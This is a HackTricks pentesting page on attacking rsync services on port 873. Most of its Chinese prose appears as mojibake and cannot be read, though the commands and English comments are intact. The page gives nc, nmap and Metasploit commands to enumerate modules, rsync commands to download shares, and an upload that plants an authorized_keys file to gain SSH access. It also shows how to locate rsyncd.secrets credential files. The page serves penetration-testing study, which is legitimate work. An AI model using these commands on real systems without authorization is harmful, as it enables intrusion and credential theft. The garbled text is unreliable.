# 873 - Rsyncæ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* å¦‚æœä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œï¼Œæƒ³åœ¨**HackTricks**ä¸Šçœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…æƒ³è¦è·å–**PEASSæœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—ã€‚
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹å•†å“**](https://peass.creator-spring.com)ã€‚
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **åŸºæœ¬ä¿¡æ¯**

> **rsync** æ˜¯ä¸€ä¸ªç”¨äºåœ¨è®¡ç®—æœºä¸å¤–éƒ¨ç¡¬ç›˜é©±åŠ¨å™¨ä¹‹é—´ä»¥åŠç½‘ç»œè®¡ç®—æœºä¹‹é—´é«˜æ•ˆ[ä¼ è¾“](https://en.wikipedia.org/wiki/File\_transfer)å’Œ[åŒæ­¥](https://en.wikipedia.org/wiki/File\_synchronization)[æ–‡ä»¶](https://en.wikipedia.org/wiki/Computer\_file)çš„å®ç”¨ç¨‹åºï¼Œé€šè¿‡æ¯”è¾ƒæ–‡ä»¶çš„[ä¿®æ”¹æ—¶é—´](https://en.wikipedia.org/wiki/Timestamping\_\(computing\))å’Œå¤§å°ã€‚å®ƒé€šå¸¸å¯ä»¥åœ¨[ç±»Unix](https://en.wikipedia.org/wiki/Unix-like)[æ“ä½œç³»ç»Ÿ](https://en.wikipedia.org/wiki/Operating\_system)ä¸­æ‰¾åˆ°ã€‚rsyncç®—æ³•æ˜¯ä¸€ç§[å¢é‡ç¼–ç ](https://en.wikipedia.org/wiki/Delta\_encoding)ï¼Œç”¨äºæœ€å°åŒ–ç½‘ç»œä½¿ç”¨ã€‚[Zlib](https://en.wikipedia.org/wiki/Zlib)å¯ç”¨äºé¢å¤–çš„[æ•°æ®å‹ç¼©](https://en.wikipedia.org/wiki/Data\_compression)ï¼Œ[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3)è€Œ[SSH](https://en.wikipedia.org/wiki/Secure\_Shell)æˆ–[stunnel](https://en.wikipedia.org/wiki/Stunnel)å¯ç”¨äºå®‰å…¨æ€§ã€‚

æ¥è‡ª[wikipedia](https://en.wikipedia.org/wiki/Rsync)ã€‚

**é»˜è®¤ç«¯å£ï¼š** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## æšä¸¾

### æ¨ªå¹… & æ‰‹åŠ¨é€šä¿¡
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **æšä¸¾å…±äº«æ–‡ä»¶å¤¹**

**rsync æ¨¡å—æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç›®å½•å…±äº«**ã€‚è¿™äº›æ¨¡å—**å¯ä»¥é€‰æ‹©ç”±å¯†ç ä¿æŠ¤**ã€‚æ­¤é€‰é¡¹åˆ—å‡ºå¯ç”¨æ¨¡å—ï¼Œå¹¶å¯é€‰åœ°ç¡®å®šè®¿é—®æ¨¡å—æ˜¯å¦éœ€è¦å¯†ç ï¼š
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
è¯·æ³¨æ„ï¼Œå…±äº«åç§°å¯èƒ½è¢«é…ç½®ä¸ºä¸æ˜¾ç¤ºã€‚å› æ­¤ï¼Œå¯èƒ½æœ‰ä¸€äº›**éšè—**çš„å†…å®¹ã€‚
è¯·æ³¨æ„ï¼Œå¯èƒ½ä¼šåˆ—å‡ºä¸€äº›éœ€è¦ä¸€äº›ï¼ˆä¸åŒçš„ï¼‰**å‡­è¯**æ‰èƒ½è®¿é—®çš„**å…±äº«åç§°**ã€‚å› æ­¤ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰åˆ—å‡ºçš„åç§°éƒ½èƒ½è®¿é—®ï¼Œå¦‚æœåœ¨å°è¯•è®¿é—®è¿™äº›åç§°æ—¶æ”¶åˆ°**â€œè®¿é—®æ‹’ç»â€**æ¶ˆæ¯ï¼Œä½ å°†ä¼šæ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚

### [**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#rsync)

### æ‰‹åŠ¨ Rsync

ä¸€æ—¦ä½ æœ‰äº†**æ¨¡å—åˆ—è¡¨**ï¼Œæ ¹æ®ä½ æƒ³è¦é‡‡å–çš„è¡ŒåŠ¨ä»¥åŠæ˜¯å¦éœ€è¦è®¤è¯ï¼Œä½ æœ‰å‡ ç§ä¸åŒçš„é€‰é¡¹ã€‚**å¦‚æœä¸éœ€è¦è®¤è¯**ï¼Œä½ å¯ä»¥**åˆ—å‡º**ä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼š
```bash
rsync -av --list-only rsync://192.168.0.123/shared_name
```
And **å¤åˆ¶** all **æ–‡ä»¶** to your local machine via the following command:
```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
è¿™å°†**é€’å½’ä¼ è¾“ç›®å½•** `<shared_name>` ä¸­çš„æ‰€æœ‰æ–‡ä»¶ä»æœºå™¨ `<IP>` åˆ°æœ¬åœ°æœºå™¨ä¸Šçš„ `./rsync_shared` ç›®å½•ã€‚æ–‡ä»¶ä»¥â€œå½’æ¡£â€æ¨¡å¼ä¼ è¾“ï¼Œç¡®ä¿åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¿ç•™ç¬¦å·é“¾æ¥ã€è®¾å¤‡ã€å±æ€§ã€æƒé™ã€æ‰€æœ‰æƒç­‰ã€‚

å¦‚æœæ‚¨**æ‹¥æœ‰å‡­æ®**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤**åˆ—å‡º/ä¸‹è½½**ä¸€ä¸ª**å…±äº«åç§°**ï¼ˆå°†æç¤ºè¾“å…¥å¯†ç ï¼‰ï¼š
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ rsync **ä¸Šä¼ **ä¸€äº›**å†…å®¹**ï¼ˆä¾‹å¦‚ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ª _**authorized\_keys**_ æ–‡ä»¶ä»¥è·å–å¯¹ç›’å­çš„è®¿é—®æƒé™ï¼‰ï¼š
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

æ‰¾åˆ°rsyncdé…ç½®æ–‡ä»¶ï¼š
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œæœ‰æ—¶ä½ ä¼šå‘ç°å‚æ•° _secrets file = /path/to/file_ï¼Œè¿™ä¸ªæ–‡ä»¶å¯èƒ½åŒ…å«ç”¨äºè®¤è¯åˆ° rsyncd çš„ç”¨æˆ·åå’Œå¯†ç ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨**HackTricks**ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼ŸæŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—ã€‚
* è·å–[**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **æ¨ç‰¹** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨**æˆ‘ã€‚
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
